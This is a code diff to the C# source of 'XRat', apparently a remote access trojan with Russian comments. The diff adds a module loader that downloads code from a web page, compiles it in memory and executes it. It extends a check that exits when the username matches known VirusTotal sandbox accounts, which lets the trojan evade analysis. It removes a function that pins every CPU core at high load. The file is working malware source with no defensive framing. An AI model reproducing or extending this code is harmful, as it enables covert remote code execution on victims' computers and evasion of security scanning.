@@ -1,8 +1,11 @@
-﻿using System;
+﻿using Microsoft.CSharp;
+using System;
+using System.CodeDom.Compiler;
 using System.Diagnostics;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Windows.Forms.Design;
+using HtmlAgilityPack;
 
 namespace XRat
 {
@@ -140,38 +143,6 @@ namespace XRat
             return true;
         }
 
-        public static void DestroyPC()
-        {
-            int numberOfThreads = Environment.ProcessorCount; // Получаем количество логических процессоров
-            int targetLoad = 90; // Целевая нагрузка - 90%
-
-            // Вычисляем, сколько процентов времени процессор должен быть занят
-            int workTime = 100; // Время работы в миллисекундах
-            int idleTime = (100 - targetLoad); // Время бездействия
-
-            // Запускаем несколько потоков
-            for (int i = 0; i < numberOfThreads; i++)
-            {
-                Thread t = new Thread(() =>
-                {
-                    while (true)
-                    {
-                        // Нагружаем процессор на заданный процент
-                        var sw = Stopwatch.StartNew();
-                        while (sw.ElapsedMilliseconds < workTime)
-                        {
-                            // Сложные вычисления для загрузки процессора
-                            Math.Sqrt(new Random().NextDouble()); // Математическая операция для нагрузки
-                        }
-                        // Отдыхаем, чтобы не создать 100% нагрузку
-                        Thread.Sleep(idleTime);
-                    }
-                });
-                t.IsBackground = true; // Потоки будут завершаться при завершении программы
-                t.Start();
-            }
-        }
-
         public static string Startup()
         {
             Settings.filename = Settings.filename + ".exe";
@@ -216,15 +187,101 @@ namespace XRat
 
         public static void CheckVirusTotal()
         {
-            string[] virusTotalUsers = ["azure", "abby", "george", "bruno", "rtucker", "john"];
+            string[] virusTotalUsers = ["azure", "abby", "george", "bruno", "rtucker", "john", "administrator", "anrose"];
 
             string username = ProCMD("whoami").output;
             username = username.Split('\\')[1];
 
-            if (virusTotalUsers.Contains(username)) 
+            if (virusTotalUsers.Contains(username))
             {
                 Environment.Exit(0); // Leaving if it's VirusTotal VM
             }
+        }
+
+        public static async Task<string> ParseCodeFromRawLink(string url)
+        {
+            using (HttpClient client = new HttpClient())
+            {
+                try
+                {
+                    // Получаем HTML-контент страницы
+                    string htmlContent = await client.GetStringAsync(url);
+
+                    // Создаем объект HtmlDocument для парсинга HTML
+                    var htmlDocument = new HtmlDocument();
+                    htmlDocument.LoadHtml(htmlContent);
+
+                    // Извлекаем все теги <pre>
+                    var preTags = htmlDocument.DocumentNode.SelectNodes("//pre");
+
+                    // Если теги <pre> найдены, возвращаем содержимое первого
+                    if (preTags != null && preTags.Count > 0)
+                    {
+                        return preTags[0].InnerText; // Возвращаем текст первого тега <pre>
+                    }
+                    else
+                    {
+                        // Если теги <pre> не найдены, возвращаем пустую строку
+                        return string.Empty;
+                    }
+                }
+                catch (Exception ex)
+                {
+                    // Логируем ошибку
+                    // Console.WriteLine($"Произошла ошибка при скачивании или парсинге страницы: {ex.Message}");
+
+                    // Возвращаем пустую строку в случае ошибки
+                    return string.Empty;
+                }
+            }
+        }
+
+        public static async Task ModuleLoader(string link)
+        {
+            await ExecuteCodeFromText(await ParseCodeFromRawLink(link));
+        }
+        public static async Task ExecuteCodeFromText(string code)
+        {
+            await Task.Run(() =>
+            {
+                // Создание компилятора
+                CSharpCodeProvider provider = new CSharpCodeProvider();
+
+                // Настройка параметров компиляции
+                CompilerParameters parameters = new CompilerParameters
+                {
+                    GenerateExecutable = false,
+                    GenerateInMemory = true
+                };
+
+                // Компиляция кода
+                CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);
+
+                // Проверка наличия ошибок компиляции
+                if (results.Errors.HasErrors)
+                {
+                    //Console.WriteLine("Ошибка компиляции:");
+                    foreach (CompilerError error in results.Errors)
+                    {
+                        //Console.WriteLine("  {0}", error.ErrorText);
+                    }
+                }
+                else
+                {
+                    // Создание экземпляра класса и вызов метода
+                    Assembly assembly = results.CompiledAssembly;
+                    Type type = assembly.GetType("UserClass");
+                    if (type != null)
+                    {
+                        dynamic instance = Activator.CreateInstance(type);
+                        instance.Execute();
+                    }
+                    else
+                    {
+                        //Console.WriteLine("Не найден класс UserClass.");
+                    }
+                }
+            });
         }
     }
 }
